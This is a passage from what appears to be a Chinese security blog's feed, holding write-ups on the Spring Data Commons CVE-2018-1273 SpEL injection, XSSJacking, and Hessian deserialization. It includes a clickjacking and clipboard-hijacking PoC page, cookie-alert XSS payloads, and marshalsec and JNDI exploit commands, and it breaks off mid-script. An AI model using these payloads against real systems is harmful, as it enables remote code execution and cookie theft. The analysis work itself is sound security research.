class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* (non-Javadoc)</span></span><br><span class="line"><span class="comment">* @see org.springframework.beans.AbstractPropertyAccessor#setPropertyValue(java.lang.String, java.lang.Object)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPropertyValue</span><span class="params">(String propertyName, @Nullable Object value)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!isWritableProperty(propertyName)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotWritablePropertyException(type, propertyName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">    context.addPropertyAccessor(<span class="keyword">new</span> PropertyTraversingMapAccessor(type, conversionService));</span><br><span class="line">    context.setTypeConverter(<span class="keyword">new</span> StandardTypeConverter(conversionService));</span><br><span class="line">    context.setTypeLocator(typeName -&gt; &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);</span><br><span class="line">    &#125;);</span><br><span class="line">    context.setRootObject(map);</span><br><span class="line"></span><br><span class="line">    Expression expression = PARSER.parseExpression(propertyName);</span><br><span class="line"></span><br><span class="line">    PropertyPath leafProperty = getPropertyPath(propertyName).getLeafProperty();</span><br><span class="line">    TypeInformation&lt;?&gt; owningType = leafProperty.getOwningType();</span><br><span class="line">    TypeInformation&lt;?&gt; propertyType = leafProperty.getTypeInformation();</span><br><span class="line"></span><br><span class="line">    propertyType = propertyName.endsWith(<span class="string">"]"</span>) ? propertyType.getActualType() : propertyType;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (propertyType != <span class="keyword">null</span> &amp;&amp; conversionRequired(value, propertyType.getType())) &#123;</span><br><span class="line"></span><br><span class="line">        PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(),</span><br><span class="line">                                                                        leafProperty.getSegment());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (descriptor == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(String.format(<span class="string">"Couldn't find PropertyDescriptor for %s on %s!"</span>,</span><br><span class="line">                                                          leafProperty.getSegment(), owningType.getType()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        MethodParameter methodParameter = <span class="keyword">new</span> MethodParameter(descriptor.getReadMethod(), -<span class="number">1</span>);</span><br><span class="line">        TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (typeDescriptor == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">                String.format(<span class="string">"Couldn't obtain type descriptor for method parameter %s!"</span>, methodParameter));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        value = conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        expression.setValue(context, value);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SpelEvaluationException o_O) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotWritablePropertyException(type, propertyName, <span class="string">"Could not write property!"</span>, o_O);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的流程为：</p><ol><li>首先通过isWritableProperty()函数校验propertyName参数（来自表单提交的参数），检测是否为Controller中设置的Form映射对象中的成员变量；</li><li>然后创建一个StandardEvaluationContext，同时调用PARSER.parseExpression()设置需要解析的表达式的值为函数传入的参数；</li><li>最后调用expression.setValue()进行SpEL表达式解析；</li></ol><p>接着跟踪isWritableProperty()函数，查看是如何过滤propertyName参数的，其最终是调用的getPropertyPath()函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> PropertyPath <span class="title">getPropertyPath</span><span class="params">(String propertyName)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    String plainPropertyPath = propertyName.replaceAll(<span class="string">"\\[.*?\\]"</span>, <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">return</span> PropertyPath.from(plainPropertyPath, type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是通过正则将包括中括号在内的内容给替换为空，然后判断剩下的内容是否为type里的属性。这里type就是在Controller处用到的用于接收参数的类。</p><p>因此，我们可以用这个类的一个字段再加上[payload]来构造恶意的SpEL表达式就可以实现RCE了。</p><p>还有一个坑，就是下面这段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">context.setTypeLocator(typeName -&gt; &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这是Spring Data Commons 2.0.5版本中添加的用来拒绝SpEL表达式的。这里如果直接使用<code>T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;)</code>这样的原始payload是不会成功触发的，但是可以像前面复现那样利用反射来绕过。</p><p>接着我们看下外部参数是通过那个Controller进来的。</p><p>代码位置为：<a href="https://github.com/spring-projects/spring-data-examples/blob/master/web/example/src/main/java/example/users/web/UserController.java#L83" target="_blank" rel="noopener">https://github.com/spring-projects/spring-data-examples/blob/master/web/example/src/main/java/example/users/web/UserController.java#L83</a></p><p>这是Controller的代码，register()函数支持POST方式获取用户表单参数数据，这其中就有UserForm、BindingResult、Model：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Registers a new &#123;<span class="doctag">@link</span> User&#125; for the data provided by the given &#123;<span class="doctag">@link</span> UserForm&#125;. Note, how an interface is used to</span></span><br><span class="line"><span class="comment">* bind request parameters.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> userForm the request data bound to the &#123;<span class="doctag">@link</span> UserForm&#125; instance.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> binding the result of the binding operation.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> model the Spring MVC &#123;<span class="doctag">@link</span> Model&#125;.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(method = RequestMethod.POST)</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">register</span><span class="params">(UserForm userForm, BindingResult binding, Model model)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    userForm.validate(binding, userManagement);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (binding.hasErrors()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"users"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    userManagement.register(<span class="keyword">new</span> Username(userForm.getUsername()), Password.raw(userForm.getPassword()));</span><br><span class="line"></span><br><span class="line">    RedirectView redirectView = <span class="keyword">new</span> RedirectView(<span class="string">"redirect:/users"</span>);</span><br><span class="line">    redirectView.setPropagateQueryParams(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirectView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在问题是这段Controller代码是怎么和漏洞类MapDataBinder关联起来的。</p><p>看廖新喜大佬的博客，说是Form表单的提交操作会调用到ProxyingHandlerMethodArgumentResolver，而ProxyingHandlerMethodArgumentResolver中使用了MapDataBinder的接口，从而使之触发。</p><p>ProxyingHandlerMethodArgumentResolver中使用MapDataBinder的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* (non-Javadoc)</span></span><br><span class="line"><span class="comment">* @see org.springframework.web.method.annotation.ModelAttributeMethodProcessor#createAttribute(java.lang.String, org.springframework.core.MethodParameter, org.springframework.web.bind.support.WebDataBinderFactory, org.springframework.web.context.request.NativeWebRequest)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">createAttribute</span><span class="params">(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 NativeWebRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    MapDataBinder binder = <span class="keyword">new</span> MapDataBinder(parameter.getParameterType(), conversionService.getObject());</span><br><span class="line">    binder.bind(<span class="keyword">new</span> MutablePropertyValues(request.getParameterMap()));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> proxyFactory.createProjection(parameter.getParameterType(), binder.getTarget());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ProxyingHandlerMethodArgumentResolver实现了 BeanFactoryAware和BeanClassLoaderAware，所以是在Bean装配后被自动调用的。</p><p>具体的Controller到MapDataBinder类触发的过程及原理分析可参考：</p><p><a href="https://github.com/iflody/myBugAnalyze/blob/master/2018/CVE-2018-1273/README.md" target="_blank" rel="noopener">https://github.com/iflody/myBugAnalyze/blob/master/2018/CVE-2018-1273/README.md</a></p><p><a href="https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/" target="_blank" rel="noopener">https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/</a></p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>看下Spring Data Commons 2.0.6版本的官方补丁是如何修复的：<a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="noopener">https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a></p><p><img src="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/5.png" alt=""></p><p>其实就是使用了SpEL表达式注入漏洞的通用修补方法，即将StandardEvaluationContext替代为SimpleEvaluationContext，由于StandardEvaluationContext权限过大，可以执行任意代码，会被恶意用户利用。 SimpleEvaluationContext的权限则小的多，只支持一些Map结构，通用的jang.lang.Runtime、java.lang.ProcessBuilder等都已经不再支持，这样也就成功防御了SpEL表达式注入漏洞。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://xz.aliyun.com/t/2269" target="_blank" rel="noopener">Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&amp;mid=2247483666&amp;idx=1&amp;sn=91e3b2aab354c55e0677895c02fb068c" target="_blank" rel="noopener">CVE-2018-1273: RCE with Spring Data Commons 分析和利用</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
      <category term="SpEL注入" scheme="https://www.mi1k7ea.com/tags/SpEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析XSSJacking</title>
    <link href="https://www.mi1k7ea.com/2020/01/26/%E6%B5%85%E6%9E%90XSSJacking/"/>
    <id>https://www.mi1k7ea.com/2020/01/26/浅析XSSJacking/</id>
    <published>2020-01-26T07:49:05.000Z</published>
    <updated>2020-01-28T02:55:43.303Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>主要是参考学习了这篇文章的姿势：<a href="https://www.freebuf.com/articles/web/130462.html" target="_blank" rel="noopener">一种结合了点击劫持、Self-XSS、复制粘贴劫持的新型XSS攻击</a></p><h2 id="0x01-XSSJacking"><a href="#0x01-XSSJacking" class="headerlink" title="0x01 XSSJacking"></a>0x01 XSSJacking</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>XSSJacking即XSS劫持，是一种另类的XSS利用方式。具体的说，就是结合Self-XSS、ClickJacking、复制粘贴劫持等漏洞进行组合利用，提高Self-XSS漏洞危害程序。</p><p>Self-XSS(自跨站脚本攻击)是一种由受害者自己输入XSS payload触发才能成功的XSS攻击行为，这种攻击可基于DOM，或是建立在仅该用户可操作或可见的域。</p><p>ClickJacking即点击劫持，是指在一个Web页面下隐藏了一个透明的iframe（opacity：0），用外层假页面诱导用户点击，实际上是在隐藏的frame上触发了点击事件进行一些用户不知情的操作。通常是因为目标服务器未设置X-Frame-Options头或未安全设置该头导致存在ClickJacking漏洞的。</p><p>复制粘贴劫持，就是在诱使用户进行复制粘贴操作时，会进行一些恶意的操作。</p><h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><p>目标站点某个页面存在Self-XSS，并且目标站点存在ClickJacking漏洞，此时这种攻击就能派上用场了。</p><h4 id="目标站点存在Self-XSS"><a href="#目标站点存在Self-XSS" class="headerlink" title="目标站点存在Self-XSS"></a>目标站点存在Self-XSS</h4><p>xssjacking.html，存在Self-XSS的页面，需要引入angular.min.js和main.js，主要是有一个文本输入框，其中ng-change指令的作用是当输入框的值改变时执行函数，ng-model指令可以将输入域的值与 AngularJS 创建的变量绑定。：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"angular.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">ng-app</span>=<span class="string">"xssApp"</span> <span class="attr">ng-controller</span>=<span class="string">"mainController"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span> <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">placeholer</span>=<span class="string">"Vulnerable to XSS"</span> <span class="attr">ng-model</span>=<span class="string">"textArea"</span> <span class="attr">ng-change</span>=<span class="string">"checkForAlert(textArea)"</span> <span class="attr">style</span>=<span class="string">"height:100%; width:100%;"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>main.js代码如下，模拟的输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>即可X自己，这里需要AngularJS的支持：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> redisApp = angular.module(<span class="string">'xssApp'</span>, []);</span><br><span class="line">redisApp.controller(<span class="string">'mainController'</span>, [<span class="string">'$scope'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">    $scope.checkForAlert = <span class="function"><span class="keyword">function</span>(<span class="params">text</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(text == <span class="string">"&lt;script&gt;alert(document.cookie)&lt;/script&gt;"</span>)&#123;</span><br><span class="line">            alert(<span class="built_in">document</span>.cookie);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;]);</span><br></pre></td></tr></table></figure><p>这个页面就是个文本输入界面，当用户自己输入XSS payload时就会弹框：</p><p><img src="/2020/01/26/浅析XSSJacking/1.png" alt=""></p><h4 id="目标站点存在ClickJacking"><a href="#目标站点存在ClickJacking" class="headerlink" title="目标站点存在ClickJacking"></a>目标站点存在ClickJacking</h4><p>我们查看响应，发现目标站点并未设置X-Frame-Options头，即存在ClickJacking漏洞：</p><p><img src="/2020/01/26/浅析XSSJacking/2.png" alt=""></p><p>接着，攻击者可以编写如下PoC：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        Enter your email below to register:</span><br><span class="line">        <span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">style</span>=<span class="string">"width:220px; height:35px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">        Repeat your email:</span><br><span class="line">        <span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">"width:230px; height:50px;"</span> <span class="attr">frameBorder</span>=<span class="string">"0"</span> <span class="attr">src</span>=<span class="string">"xssjacking.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.addEventListener(<span class="string">'copy'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(e);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// </span></span></span><br><span class="line"><span class="actionscript">                e.clipboardData.setData(<span class="string">'text/plain'</span>, <span class="string">'\x3cscript\x3ealert(document.cookie)\x3c/script\x3e'</span>);</span></span><br><span class="line"><span class="actionscript">                e.preventDefault(); <span class="comment">// We want our data, not data from any selection, to be written to the clipboard</span></span></span><br><span class="line"><span class="undefined">            &#125;);</span></span><br><span class="line"><span class="undefined">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>简单地说，该恶意页面表面是输入邮箱和验证邮箱的表单，实际是通过iframe标签引入隐藏的页面即存在Self-XSS漏洞的页面，其中页面通过JS实现复制粘贴劫持攻击，当用户在该页面进行粘贴操作时其中的内容就会被替换为Self-XSS的payload，也就是说实际上是在Self-XSS页面中输入了XSS payload。</p><p>比如，已在目标站点登录获得cookie的用户被诱使访问了该恶意页面，输入邮箱之后，当再次输入验证邮箱时，用户通常会直接对前面输入的邮箱进行复制然后粘贴到下面验证的输入框中，此时就会触发Self-XSS弹框：</p><p><img src="/2020/01/26/浅析XSSJacking/3.png" alt=""></p><p>至此，攻击者就能通过钓鱼的手段结合ClickJacking、Self-XSS和复制粘贴劫持等漏洞实现窃取受害者的cookie等敏感信息。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>个人觉得就是利用ClickJacking和复制粘贴实现Self-XSS的利用，扩大Self-XSS的危害程序，使其和常规的XSS一样存在高风险。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://www.mi1k7ea.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Java Hessian反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/01/25/Java-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/01/25/Java-Hessian反序列化漏洞/</id>
    <published>2020-01-25T00:46:52.000Z</published>
    <updated>2020-02-02T09:39:23.955Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Hessian简介"><a href="#0x01-Hessian简介" class="headerlink" title="0x01 Hessian简介"></a>0x01 Hessian简介</h2><p>Hessian是一个轻量级的remoting onhttp工具，是一个轻量级的Java序列化/反序列化框架，使用简单的方法提供了RMI的功能。 相比WebService，Hessian更简单、快捷。采用的是二进制RPC协议，因为采用的是二进制协议，所以它很适合于发送二进制数据。</p><p>Hessian序列化/反序列化机制的基本概念图如下：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/16.png" alt=""></p><ul><li>AbstractSerializerFactory：抽象序列化器工厂，是管理和维护对应序列化/反序列化机制的工厂，拥有getSerializer()和getDeserializer()方法。默认的几种实现如下：<ul><li>SerializerFactory：标准的实现。</li><li>ExtSerializerFactory：可以设置自定义的序列化机制，通过该Factory可以进行扩展。</li><li>BeanSerializerFactory：对SerializerFactory的默认Object的序列化机制进行强制指定，指定为BeanSerializer。 </li></ul></li><li>Serializer：序列化的接口，拥有writeObject()方法。</li><li>Deserializer：反序列化的接口，拥有readObject()、resdMap()、readList()方法。</li><li>AbstractHessianInput：Hessian自定义的输入流，提供对应的read各种类型的方法。</li><li>AbstractHessianOutput：Hessian自定义的输出流，提供对应的write各种类型的方法。</li></ul><p>在Hessian的Serializer中，有以下几种默认实现的序列化器：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/17.png" alt=""></p><p>在Hessian的Deserializer中，有以下几种默认实现的反序列化器：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/18.png" alt=""></p><p>这里我们关注到MapDeserializer这个反序列化器即可，其在后面的反序列化漏洞利用中应用到。</p><h2 id="0x02-Hessian反序列化漏洞"><a href="#0x02-Hessian反序列化漏洞" class="headerlink" title="0x02 Hessian反序列化漏洞"></a>0x02 Hessian反序列化漏洞</h2><p>和Java原生的序列化对比，Hessian更加高效并且非常适合二进制数据传输。既然是一个序列化/反序列化框架，Hessian同样存在反序列化漏洞的问题。</p><p>对于Hessian反序列化漏洞的利用，使用ysoserial工具的Gadget是无法成功的，而是要用marshalsec工具的Gadget。</p><p>marshalsec工具项目如下：<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></p><p>针对Hessian反序列化过程进行攻击，就需要使用特殊的Gadget，在marshalsec这个工具里，已经有了5个可用的Gadgets。分别是：</p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringAbstractBeanFactoryPointcutAdvisor</li></ul><h3 id="复现——Resin-Gadget"><a href="#复现——Resin-Gadget" class="headerlink" title="复现——Resin Gadget"></a>复现——Resin Gadget</h3><p>Hessian环境搭建按照参考文章很方便就搞好。</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/3.png" alt=""></p><p>和JNDI注入时一样，现在要搭建恶意的JNDI服务端，这里直接用JNDI注入利用工具项目而不用像之前一样自己写服务端代码：<a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>使用方法如下，-C参数为需要执行的命令，-A参数为监听地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</span><br></pre></td></tr></table></figure><p>这里我们用直接启动就行，可以看到是有三个不同的服务端对应不同的端口：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/1.png" alt=""></p><p>直接用marshalsec来生成payload，这里地址指定为JettyServer并在指定恶意执行类为ExecTemplateJDK7：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian Resin http://127.0.0.1:8180/ ExecTemplateJDK7&gt;hessian</span><br></pre></td></tr></table></figure><p>最后就是编写序列化的payload发送到服务器，这里直接看下原作者的脚本是怎么写的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">h<span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># code by 21superman</span></span><br><span class="line"><span class="comment"># Date 2018年12月28日</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(name)</span>:</span></span><br><span class="line">    header=<span class="string">b'\x63\x02\x00\x48\x00\x04'</span>+<span class="string">'test'</span></span><br><span 